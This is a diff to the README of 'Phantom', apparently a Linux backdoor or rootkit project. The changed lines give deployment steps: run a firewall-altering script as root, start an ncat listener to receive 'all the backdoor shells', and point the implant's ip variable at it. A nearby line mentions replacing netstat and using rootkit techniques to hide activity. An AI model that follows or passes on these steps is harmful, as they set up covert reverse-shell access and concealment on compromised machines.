@@ -19,7 +19,7 @@ phantom-firewall: This file modifies nftables rules so that it doesn't allow mor
 	new bash shells, increasing the footprint of Phantom actions and putting increasing and uneeded load on the target system.
 
 Order of execution:
-1. Execute phantom-firewall as root, so it can modify the firewall rules.
+1. Execute phantom-firewall as root, so it can modify the firewall rules. (Change the ip and port that the script uses according to the ones that ncat uses.)
 2. Create an ncat listening process at a port different from the one specified in the phantom-init file. This is where all the backdoor shells will go. There is some procedure involved in doing so:
 	a) Open the phantom file.
 	b) Change the ip variable according to the ncat ip and port.
@@ -42,3 +42,4 @@ solution to this would be to replace netstat and all the major open-source rootk
 
 Konstantinos Sarantopoulos
 konsaranto@gmail.com
+
